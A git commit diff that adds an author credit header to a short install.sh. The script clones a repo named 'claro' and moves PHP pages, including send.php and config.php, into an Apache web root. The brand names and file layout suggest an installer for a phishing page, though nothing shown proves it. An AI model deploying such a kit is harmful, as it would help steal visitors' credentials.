0fa8ce5a74a569247d9273e484205c2614ec9594
RESEKK VPS <103382307+resekk-vps@users.noreply.github.com>
2022-04-11 08:50:24 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,4 +1,8 @@
 #!/bin/bash
+#
+# Created by: @K41S3RR - https://t.me/K41S3RR
+#
+# ==============================================
 cd /etc/apache2/sites-available; nano 000-default.conf
 cd /var/www; git clone https://github.com/resekk-vps/claro
 cd /var/www/tuenti; mv ccs /var/www; mv css /var/www; mv data /var/www; mv fonts /var/www; mv js /var/www; mv parts /var/www; mv config.php /var/www; mv favicon.png /var/www; mv index.php /var/www; mv send.php /var/www
